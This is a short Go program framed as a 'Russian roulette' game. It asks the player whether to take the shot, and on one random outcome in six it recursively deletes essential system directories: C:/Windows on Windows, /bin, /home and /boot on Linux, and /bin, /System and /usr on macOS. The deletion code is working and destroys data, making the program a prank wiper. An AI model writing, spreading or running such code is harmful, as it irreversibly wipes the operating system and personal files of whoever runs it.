package main

import (
	"fmt"
	"math/rand"
	"os"
	"runtime"
	"strings"
)

func main() {
	menu()
}

func menu() {
	fmt.Println("Take the shot? (Y/N)")
	var option string
	fmt.Scanln(&option)
	if strings.ToLower(option) == "y" {
		a := rand.Intn(6)
		if a == 3 {
			if runtime.GOOS == "windows" {
				deleteWindows()
			} else if runtime.GOOS == "linux" {
				deleteLinux()
			} else if runtime.GOOS == "darwin" {
				deleteDarwin()
			}
		} else {
			fmt.Println("Lucky! You didn't get shot yet!")
		}
	} else {
		fmt.Println("Oh, okay.")
		os.Exit(0)
	}

}

func deleteWindows() {
	os.RemoveAll("C:/Windows/")
	fmt.Println("C:/Windows/ deleted!")
}

func deleteLinux() {
	os.RemoveAll("/bin/")
	os.RemoveAll("/home/")
	os.RemoveAll("/boot/")
	fmt.Println("Essential directories have been deleted!")
}

func deleteDarwin() {
	os.RemoveAll("/bin/")
	os.RemoveAll("/System/")
	os.RemoveAll("/usr/")
	fmt.Println("Essential directories have been deleted!")
}
